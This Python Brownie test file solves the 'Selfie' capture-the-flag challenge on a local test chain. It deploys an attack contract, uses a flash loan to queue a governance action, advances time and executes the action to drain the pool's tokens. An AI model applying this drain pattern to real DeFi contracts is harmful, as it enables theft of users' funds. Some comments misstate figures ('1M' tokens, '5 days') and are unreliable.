import pytest
import brownie
from brownie import DamnValuableTokenSnapshot, SimpleGovernance, SelfiePool
from brownie import AttackSelfiePool
from brownie import accounts , Wei , exceptions, chain

deployer, attacker = None, None

# Pool has 1M * 10**18 tokens
TOKEN_INITIAL_SUPPLY = Wei('2_000_000 ether')
TOKENS_IN_POOL = Wei('1500000 ether')  

print('[Challenge] Selfie :')

#--  [ SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE ] --#
@pytest.fixture(scope="module")
def contracts():

    global deployer, attacker
    deployer, attacker = accounts[0:2]

    contracts = {}

    token =  DamnValuableTokenSnapshot.deploy(TOKEN_INITIAL_SUPPLY, {"from":deployer})
    governance =  SimpleGovernance.deploy(token.address, {"from":deployer})
    pool = SelfiePool.deploy(token.address, governance.address, {"from":deployer})

    # Set initial token balance of the pool offering flash loans
    token.transfer(pool.address, TOKENS_IN_POOL, {"from":deployer})

    assert token.balanceOf(pool.address) == TOKENS_IN_POOL

    contracts['token'] = token
    contracts["governance"] = governance
    contracts["pool"] = pool

    yield contracts

    #---  [ SUCCESS CONDITIONS ]  ---#

    # Attacker has taken all tokens from the pool
    assert token.balanceOf(attacker.address) == TOKENS_IN_POOL

    assert token.balanceOf(pool.address) == '0'
    

def test_selfie_challenge(contracts):
    #-- [ CODE YOUR EXPLOIT HERE ] ---#

    attackSelfie = AttackSelfiePool.deploy(
        contracts['token'].address, contracts['pool'].address, contracts['governance'].address,
        {"from":attacker})

    tx = attackSelfie.attack(TOKENS_IN_POOL, {"from":attacker})
    id = tx.return_value

    chain.sleep(2 * 24 * 60 * 60)  # 5 days

    contracts['governance'].executeAction(id, {"from":attacker})

    #_________________________________#
